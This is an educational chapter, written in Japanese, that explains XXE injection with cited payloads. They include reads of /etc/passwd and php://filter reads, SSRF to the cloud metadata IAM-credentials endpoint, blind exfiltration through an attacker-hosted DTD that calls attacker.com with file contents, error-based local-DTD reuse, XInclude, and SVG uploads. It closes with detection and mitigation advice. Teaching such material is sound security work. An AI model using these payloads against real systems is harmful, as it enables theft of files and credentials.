## XXEとは何か（一次資料の概説）

### なぜXMLがsink（入力が最終的に危険な形で解釈・実行される代入先）になり得るのか

XXE（XML External Entity injection、XML外部実体インジェクション）は、アプリケーションがユーザーの制御可能なXMLデータを処理する際に生じる脆弱性である。PortSwiggerの定義を借りれば、

> "XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data."（XXEとは、アプリケーションがXMLデータを処理する方法に攻撃者が干渉できるようにするWebセキュリティ脆弱性である）

XXEが成立する根本原因は、アプリケーションのロジックのバグではなく、**XML仕様そのものが持つ機能**にある。PortSwiggerは次のように述べている。

> "the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application."（XML仕様には潜在的に危険な機能が複数含まれており、標準的なパーサはアプリケーションが通常それらを使用していなくても、これらの機能をサポートしてしまう）

つまり、開発者が「外部ファイルを読み込む」というコードを一行も書いていなくても、XMLパーサをデフォルト設定のまま使うだけで、XML文書内の宣言によって外部リソース読み込みという挙動が“後から”注入されてしまう。これがXXEの核心である。SQLインジェクションが「SQL文の構文を乗っ取る」攻撃だとすれば、XXEは「XMLパーサの構文解釈そのものを乗っ取る」攻撃と言える。

> 出典: PortSwigger Web Security Academy「What is XXE injection?」— https://portswigger.net/web-security/xxe

### DTDとエンティティの基礎

XXEを理解するには、まずXMLのDTD（Document Type Definition、文書型定義）とエンティティ（entity、文書内で再利用される値の置き換え単位）の仕組みを押さえる必要がある。HackTricksは次のようにXMLの基本構成要素を整理している。

- **Entities（実体）**: `&lt;` が `<` を表すように、特殊文字をタグの構文と衝突させずに表現するための仕組み。任意の文字列やファイル内容を指すエンティティを独自に定義することもできる。
- **Element Definition（要素定義）**: XMLは要素の型と、その要素が許容する内容の構造を定義できる。
- **DTD（文書型定義）**: 文書の構造とデータ型を定義するもので、内部DTD・外部DTD・両者のハイブリッドがあり得る。
- **External Entities（外部実体）**: URL（ファイルパスやネットワークURL）を参照する形で定義される実体で、これがXXEのセキュリティリスクの直接の原因になる。

> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

最も基本的な実体宣言は、値を固定文字列で置き換えるだけの単純なものである。

```xml
<!DOCTYPE foo [<!ENTITY myentity "value">]>
```

これは「`&myentity;` という参照が文書中に現れたら、パーサはそれを文字列 `value` に置換する」という宣言にすぎない。ここまでは危険はない。問題は、実体の値としてローカルファイルやネットワークリソースを指す `SYSTEM` キーワードを使えることにある。

```xml
<!DOCTYPE foo [<!ENTITY ext SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY ext SYSTEM "http://attacker.com">]>
```

`SYSTEM` はXML標準が定める「外部実体（external entity）」の宣言方法であり、パーサはこの宣言に従って**実際にそのファイルやURLへアクセスし、その内容を実体の値として読み込む**。つまりXMLパーサは、文書の構文解析（パース）の過程で、宣言に基づいてファイルI/OやネットワークI/Oを自律的に実行してしまう。ここが「なぜXXEが起きるのか」という仕組みレベルの核心である。開発者はアプリケーション層で「ファイルを読む」処理を書いていなくても、XMLの構文解析層でそれが実行されてしまう。

> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### 基本形：ファイル読み取りのペイロード

PortSwiggerが示す最も基本的なXXE攻撃の例は次の通りである。攻撃者は商品IDを問い合わせる典型的なXML APIリクエストに、悪意あるDOCTYPE宣言を挿入する。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

この仕組みを段階的に分解すると以下のようになる。

1. `<!DOCTYPE foo [ ... ]>` により、この文書専用の内部サブセット（inline DTD）を宣言する。攻撃者はアプリケーションが本来期待していないDOCTYPEブロックを、リクエストボディの先頭に挿入できてしまう。
2. `<!ENTITY xxe SYSTEM "file:///etc/passwd">` で、実体名 `xxe` を `file:///etc/passwd` という外部リソース（ローカルファイル）に束縛する。
3. 本文中の `&xxe;` という参照箇所で、パーサはこの実体を解決（resolve）しようとし、実際に `/etc/passwd` を読み込んでその内容を文字列として展開する。
4. アプリケーションが `<productId>` の値をレスポンスに含めて返す実装であれば、`/etc/passwd` の中身がそのままHTTPレスポンスに漏洩する。

HackTricksも同様の基本形を示している。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd">]>
<data>&example;</data>
```

さらに、対象がPHPで実装されている場合、ファイル内容にバイナリやXMLとして不正な文字（null文字など）が含まれると単純な読み取りが失敗することがある。そこでPHP特有の `php://filter` ラッパーを使い、読み取り時にBase64エンコードをかける手法がよく使われる。

```xml
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<data>&example;</data>
```

`php://filter/convert.base64-encode/resource=...` は、PHPのストリームラッパー機能を使い、指定リソース（ここでは `/etc/passwd`）を読み込む際にBase64変換フィルタを通す。これにより、XMLとして解釈不能な生バイナリではなく、安全な印字可能文字列としてファイル内容を持ち出せる。これはXXE特有の技術というより、「PHPアプリケーションを標的にしたXXEでよく併用される、対象言語のI/O機能に依存した補助テクニック」である点に注意したい（バージョン非依存の基礎的なPHPストリームラッパー機能であり、モダンなPHPでも利用可能）。

> 出典: PortSwigger Web Security Academy「What is XXE injection?」— https://portswigger.net/web-security/xxe
> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### SSRFへの転用：外部実体はネットワークリソースも指せる

`SYSTEM` の引数はローカルファイルパスに限らず、任意のURLを取れる。これはつまり、XXEを足がかりにSSRF（Server-Side Request Forgery、サーバー側リクエスト偽造）を成立させられることを意味する。PortSwiggerは次のように説明する。

> "An external entity is defined based on a URL to a back-end system"（外部実体は、バックエンドシステムを指すURLに基づいて定義される）

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

The Hacker Recipesが示す例では、クラウド環境のメタデータサービスを狙う、より実戦的な形が示されている。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/metadata/iam/security-credentials/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

`169.254.169.254` はAWSなど主要クラウド環境が提供するインスタンスメタデータサービス（IMDS）のリンクローカルアドレスであり、外部（インターネット）からは直接到達できないが、インスタンス自身からは到達できる。XXEを経由すればサーバー自身に代理でリクエストを発行させられるため、外部到達不能なはずの内部エンドポイントに対してSSRFが成立し、IAMクレデンシャルなどの機微情報を窃取できる可能性がある（対策・IMDSv2の詳細は本教科書のSSRF領域と重複するため、ここではXXEがSSRFの「入口」になり得るという構造理解にとどめる）。

> 出典: PortSwigger Web Security Academy「What is XXE injection?」— https://portswigger.net/web-security/xxe
> 出典: The Hacker Recipes「XXE injection」— https://www.thehacker.recipes/web/inputs/xxe-injection/

### パラメータ実体（Parameter Entity）と、なぜ通常の実体だけでは足りない場面があるのか

XML DTDには2種類の実体がある。文書本体（インスタンス）中で使う「一般実体（general entity）」と、DTD自身の中でしか参照できない「パラメータ実体（parameter entity、宣言時に `%` を前置する）」である。The Hacker Recipesはこの構文を次のように示している。

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
```

パラメータ実体が重要になるのは、**アプリケーションが実体宣言そのものは通しても、DTD内部での外部実体の直接的な参照は制限している場合**があるためである。多くの現代的なパーサ設定やWAFは、一般実体による直接的な外部参照（`&xxe;` がレスポンスにそのまま出るような単純なケース）は防いでいても、DTD構文の入れ子構造までは想定しきれていないことがある。パラメータ実体を使うと、DTDの中で「実体を動的に組み立てて、その場で評価（eval）する」という多段の仕組みを構築でき、これが後述するBlind XXE（レスポンスに直接データが返らないケース）でのデータ持ち出しの基盤になる。

> 出典: The Hacker Recipes「XXE injection」— https://www.thehacker.recipes/web/inputs/xxe-injection/
> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### Blind XXEとアウトオブバンド（OOB）でのデータ持ち出し

アプリケーションがXMLのパース結果をそのままレスポンスに含めない場合（例えばパース成功/失敗の真偽値しか返さない場合）、攻撃者は実体の解決結果を直接見ることができない。これがBlind XXEと呼ばれる状況である。PortSwiggerはこの場合の一般的な対処として、アウトオブバンド（帯域外、応用側のレスポンス経路とは別の経路でデータを受け取る）技術やエラーメッセージを利用したデータ抽出に触れている。HackTricksは、まず単純なOOB検知（Out-of-Band、脆弱性の存在確認のために攻撃者が制御するサーバーへ通信させて確認する手法）としてパラメータ実体を使う例を示す。

```xml
<!DOCTYPE foo [<!ENTITY % param SYSTEM "http://attacker.com/probe">%param;]>
```

`%param;` の参照によってパーサが攻撃者のサーバーへHTTPリクエストを送信するため、そのアクセスログにリクエストが記録されれば、レスポンスに何も表示されなくてもXXEが存在すると判定できる（コールバック検知）。

さらに一歩進めて、ファイルの中身そのものを外部に持ち出す代表的な手法が、攻撃者が用意した外部DTDを読み込ませる方式である。HackTricksは次のような外部DTD（`http://attacker.com/malicious.dtd` として公開）の例を示している。

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

このDTDを標的アプリケーションに読み込ませるための本体側ペイロードは次のようになる。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">%xxe;]>
<stockCheck><productId>3</productId></stockCheck>
```

この一連の流れを仕組みレベルで説明すると次のようになる。

1. 標的サーバーのXMLパーサが `%xxe;` を解決しようとし、`malicious.dtd` を攻撃者のサーバーから取得する。
2. 取得したDTD内で `%file` が `file:///etc/hostname` の中身に束縛される。
3. `%eval` の定義がその場で「新しい実体 `%exfiltrate` を、`%file`（＝ファイル内容）をクエリ文字列に埋め込んだURLに束縛する」というDTD断片そのものを**動的に生成**する。ここがパラメータ実体の真骨頂で、実体の値が「さらに評価されるべきDTD構文」になる、いわば多段のマクロ展開である。
4. `%eval;` によってこの新しい定義が実際に評価（パース）され、`%exfiltrate` という実体が新たに定義される。
5. `%exfiltrate;` を参照した瞬間、パーサは「`http://attacker.com/?x=(ファイル内容)`」というURLへHTTPリクエストを送信する。攻撃者はそのアクセスログのクエリ文字列からファイル内容を読み取れる。

これがBlind XXEにおける代表的なアウトオブバンド・データ持ち出し（exfiltration）の仕組みである。標的サーバーからのレスポンスに何も表示されなくても、標的サーバーから攻撃者サーバーへの「発信」を経由することでデータを盗み出せる点が核心である。

> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html
> 出典: The Hacker Recipes「XXE injection」— https://www.thehacker.recipes/web/inputs/xxe-injection/

### エラーベースの持ち出しとローカルDTD再利用（アウトバウンド通信が封じられている場合）

外部への通信（アウトオブバンド）自体がネットワークポリシーで遮断されている環境では、上記のようなコールバック型の手法が使えない。この場合に使われるのが、**意図的にパースエラーを起こし、そのエラーメッセージにファイル内容を含めてしまう**手法である。HackTricksはGNOME環境（`yelp` パッケージ）を例に、サーバー上に既に存在するローカルDTDファイルを再利用する高度な手法を示している。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY % error SYSTEM '\''file:///nonexistent/%file;'\''>">
        %eval;
        %error;
    '>
    %local_dtd;
]>
<stockCheck><productId>3</productId></stockCheck>
```

この手法が成立する背景には、次の仕組みがある。

- サーバー上に既に存在する正規のDTDファイル（`docbookx.dtd`）を `SYSTEM` で読み込む。これは外部通信を必要としない、**ローカルファイルシステム上のリソース参照**である。
- このDTDが内部で定義しているパラメータ実体（例では `ISOamso`）を、攻撃者が用意した悪意の定義で**上書き（再定義）**する。XML DTDの仕様上、同名のパラメータ実体は最初の宣言が有効になるため、攻撃者は自分の悪意の定義を**先に**書いておく必要がある。
- 再定義された実体の中で、存在しないパス（`file:///nonexistent/`）に読み取ったファイル内容（`%file;`）を連結したパスを `SYSTEM` として参照させる。
- そのようなファイルパスは当然存在しないため、パーサは「ファイルが見つからない」というパースエラーを送出するが、**そのエラーメッセージ自体に、実体展開後のファイルパス（＝機微ファイルの内容を含む文字列）がそのまま含まれる**。
- アプリケーションがXMLパースエラーの詳細をレスポンスやログに出力する実装であれば、攻撃者はそのエラーメッセージからファイル内容を読み取れる。

この手法は、外部ネットワークへの通信が一切不要な点が重要である。ファイアウォールやエグレスフィルタリング（サーバーから外部への通信を制限する対策）が完全であっても、ローカルに存在するDTDファイルパスさえ分かっていれば攻撃が成立し得る。ただし、これは**対象OS・ディストリビューション・インストール済みパッケージに依存する**攻撃手法であり、上記の `docbookx.dtd` のパスはGNOME/yelpパッケージが存在する特定のLinux環境を前提としている点に留意されたい（攻撃対象のシステム構成によって有効なローカルDTDパスは異なる）。

> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### DOCTYPEを制御できない場合の代替経路：XInclude

アプリケーションによっては、ユーザー入力がXML文書の一部の値（要素の中身）にしか反映されず、DOCTYPE宣言自体を注入する余地がない場合がある。この場合に使われるのがXIncludeという別のXML標準機能である。HackTricksは次の例を示す。

```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

XIncludeは、XML名前空間 `http://www.w3.org/2001/XInclude` を使って、他の文書やファイルの内容を現在の文書に埋め込むための標準仕様である。`parse="text"` を指定すると、参照先ファイルをXMLとしてではなくプレーンテキストとして取り込む。DOCTYPE宣言を必要とせず、要素の値の中に直接名前空間付きのXML断片を注入するだけで済むため、「DOCTYPEブロックへの注入は塞がれているが、値の中に任意のXMLタグを注入できる」という限定的な条件下でも有効になり得る点が特徴である。

> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### ファイルアップロード経由のXXE：SVGとOffice文書（本書のテーマとの接続）

本教科書のテーマである「XXE & ファイルアップロード」の接点として、XML自体が直接のAPI入力でなくとも、**XMLベースのファイル形式のアップロード機能**が新たな攻撃対象になる点は重要である。HackTricksは代表例としてSVG画像を挙げている。

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <image xlink:href="file:///etc/hostname"></image>
</svg>
```

SVG（Scalable Vector Graphics）はXMLベースの画像フォーマットであり、多くのWebアプリケーションが「画像アップロード」機能でSVGも受け付けてしまう場合、そのSVGファイル自体がDTD宣言と外部実体を含んだXML文書として解釈される可能性がある。処理系によっては、サーバー側でSVGをラスタライズ（画素データへの変換）する際に内部でXMLパーサを呼び出しており、そこでXXEが成立する。

同様に、DOCX/XLSXなどのOffice Open XML形式のファイルは、実体としては複数のXMLファイルを含むZIPアーカイブであるため、`word/document.xml` のようなファイルを書き換えて悪意のペイロードを仕込み、再度ZIP圧縮してアップロードするという手法も存在する。これらのファイルアップロード経由の攻撃面については、本教科書の後続章（ファイルアップロードを扱う章）で改めて詳細に扱う。ここでは「XXEは “JSON/XML API” だけの問題ではなく、XMLを内部形式として使うあらゆるアップロード可能なファイル形式が攻撃対象になり得る」という接続点を押さえておけば十分である。

> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### 検知の基本的な考え方

The Hacker Recipesは、XXEの検知手法として、テスト用の実体を注入し、その値がアプリケーションのレスポンスやエラーメッセージに反映されるかどうかを観察するアプローチを紹介している。実務的には、まず単純な文字列実体（例えば `<!ENTITY test "XXE-TEST-12345">` と `&test;`）を注入し、その文字列がレスポンスにそのまま出るかを確認したうえで、`file:///etc/passwd` のような読み取り対象、さらにOOB用のコールバックURLへと段階的に切り替えていくのが定石である。

> 出典: The Hacker Recipes「XXE injection」— https://www.thehacker.recipes/web/inputs/xxe-injection/

### 影響のまとめ

The Hacker RecipesおよびHackTricksが挙げる影響を整理すると、XXEが成立した場合の代表的な帰結は次の通りである。

- **機密ファイルの読み取り**（設定ファイル、認証情報、ソースコードなど）
- **SSRF**（内部ネットワークやクラウドメタデータサービスへの到達）
- **サービス拒否（DoS）**（後続章で扱う「billion laughs」など、実体の再帰的展開によるリソース枯渇攻撃）
- 特定の条件下での**リモートコード実行（RCE）**（`jar:` プロトコルや `expect://` のような特殊なストリームラッパー、特定言語・特定パーサ実装に依存する高度な手法。詳細は後続章で扱う）

> 出典: The Hacker Recipes「XXE injection」— https://www.thehacker.recipes/web/inputs/xxe-injection/
> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### 防御の基本方針（詳細は防御章で扱う）

PortSwiggerは根本対策として次を明言している。

> "Disable resolution of external entities and disable support for XInclude"（外部実体の解決を無効化し、XIncludeのサポートも無効化する）これが「最も効果的な緩和戦略」である。

これは、多くのXMLパーサライブラリがデフォルトでは外部実体解決やDTD処理を有効にしたまま出荷されている（バージョン・言語・ライブラリによって既定値は異なるため、使用しているパーサの設定ドキュメントを必ず個別に確認する必要がある）という事実の裏返しでもある。この設定変更こそが「アプリケーションコードを一切変えずにXXEクラスの脆弱性を根本から塞げる」唯一に近い対策であり、具体的な言語別・ライブラリ別の無効化設定は、本教科書の防御章で個別に扱う。

> 出典: PortSwigger Web Security Academy「What is XXE injection?」— https://portswigger.net/web-security/xxe
